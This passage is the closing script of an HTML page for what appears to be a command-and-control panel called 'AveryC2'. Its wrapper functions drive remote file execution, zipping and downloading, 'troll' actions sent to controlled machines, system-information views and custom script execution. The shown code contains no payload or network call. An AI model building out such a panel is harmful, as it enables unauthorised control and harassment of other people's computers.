                app.refreshFiles();
            }
        }
        
        function executeSelected() {
            const app = window.averyC2App;
            if (app) {
                app.executeSelected();
            }
        }
        
        function zipCurrent() {
            const app = window.averyC2App;
            if (app) {
                app.zipCurrent();
            }
        }
        
        function downloadSelected() {
            const app = window.averyC2App;
            if (app) {
                app.downloadSelected();
            }
        }
        
        function handleFmFileSelect(event) {
            const app = window.averyC2App;
            if (app) {
                app.handleFmFileSelect(event);
            }
        }
        
        function handlePathKeypress(event) {
            const app = window.averyC2App;
            if (app) {
                app.handlePathKeypress(event);
            }
        }
        
        // Initialize the application
      document.addEventListener('DOMContentLoaded', () => {
    window.averyC2App = new AveryC2();
    
    // Handle background music
    const bgMusic = document.getElementById('bgMusic');
    bgMusic.volume = 0.3; // Set volume to 30%
    
    // Try to play music on first user interaction
    const playMusic = () => {
        bgMusic.play().then(() => {
            console.log('Background music started');
            // Remove listeners once music starts
            document.removeEventListener('click', playMusic);
            document.removeEventListener('keydown', playMusic);
        }).catch(err => {
            console.log('Music autoplay prevented:', err);
        });
    };
    
    // Modern browsers require user interaction to play audio
    document.addEventListener('click', playMusic);
    document.addEventListener('keydown', playMusic);
    
    // Try to play immediately (might work on some browsers)
    playMusic();
});

function closeTrollModal() {
    document.getElementById('trollModal').style.display = 'none';
}

function sendTroll(trollType) {
    const app = window.averyC2App;
    if (app) app.sendTroll(trollType);
}

function closeSysInfoModal() {
    document.getElementById('sysInfoModal').style.display = 'none';
}

function switchSysInfoTab(tabName) {
    const app = window.averyC2App;
    if (app) app.switchSysInfoTab(tabName);
}

function closeScriptModal() {
    document.getElementById('scriptModal').style.display = 'none';
}

function executeCustomScript() {
    const app = window.averyC2App;
    if (app) app.executeCustomScript();
}
    </script>
</body>
</html>